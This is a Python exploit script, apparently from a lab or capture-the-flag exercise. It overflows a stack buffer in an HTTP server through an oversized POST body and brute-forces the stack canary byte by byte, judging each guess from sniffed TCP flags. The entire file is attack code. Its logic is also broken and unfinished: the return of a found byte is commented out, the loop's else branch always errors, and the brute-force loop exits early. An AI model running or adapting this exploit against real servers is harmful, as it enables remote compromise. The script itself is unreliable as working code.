#!/usr/bin/env python3

import binascii
import pwn
# from pwn import *
import requests
import sys
import time

import scapy.all as scapy

# server host/port
HOST = "192.168.88.128"
PORT = 8080

# amount of time to sleep b/t packets to make sure they get sent separately
SLEEP_DURATION = 0.3

log = pwn.log

def get_canary_byte(canary):
    for v in range(0x60-2,0x62):
    # for v in range(5):
        # with context(log_level="error"):
        p = pwn.remote(HOST, PORT)
        sniff = scapy.AsyncSniffer(filter=f"port {PORT}")
        sniff.start()

        ####################### crash ############################
        payload = b"\r\n".join([
            b"POST / HTTP/1.1",
            b"Host: localhost:8080",
            b"User-Agent: ggwp",
            b"Content-Length: 5000", # gets set to max length
            # b"Content-Length: 4000", # gets set to max length
            b"\r\n"
        ])

        print(f"trying {hex(v)}")

        p.send(payload)

        p.send(b"a"*2000)
        time.sleep(SLEEP_DURATION)
        # p.send(b"a"*2000)
        p.send(b"a"*2104 + canary + bytes([v]))

        p.recv()
        # p.recv()
        p.close()

        # time.sleep(1)
        sniff.stop()

        p.close()


        # last two packets are ack only if no crash
        syn_base = sniff.results[0][scapy.TCP].seq
        ack_base = sniff.results[1][scapy.TCP].ack - 1
        for p in sniff.results:
            pass
            print(f"sport={p[scapy.TCP].sport}\tflags={str(p[scapy.TCP].flags)}")
            # print(f"sport={p[scapy.TCP].sport} seq={p[scapy.TCP].seq - syn_base}, ack={p[scapy.TCP].ack - ack_base}, flags={str(p[scapy.TCP].flags)}")
            # print(str(p[scapy.TCP].flags) == "A")

        # check for a fin packet
        # https://stackoverflow.com/a/54029053

        # if sniff.results[-1][scapy.TCP].flags.F:
        pkts = sniff.results
        # if str(pkts[-2][scapy.TCP].flags) == "A" and str(pkts[-1][scapy.TCP].flags) == "A":
        if str(pkts[-1][scapy.TCP].flags) == "A":
            # properly closed, no crash
            # this means we have the next byte of the canary
            # return v
            pass
    else:
        log.error("couldn't get a byte")
        return b""

def brute_canary():
    canary = b"\x00"
    while len(canary) != 8:
        v = get_canary_byte(canary)
        time.sleep(SLEEP_DURATION)
        # input("enter to continue...")
        if v is not None:
            canary += bytes([v])
            log.info("got another: " + binascii.hexlify(canary).decode())
            return
        else:
            return

    log.success("got full canary: " + repr(canary))

    return canary

brute_canary()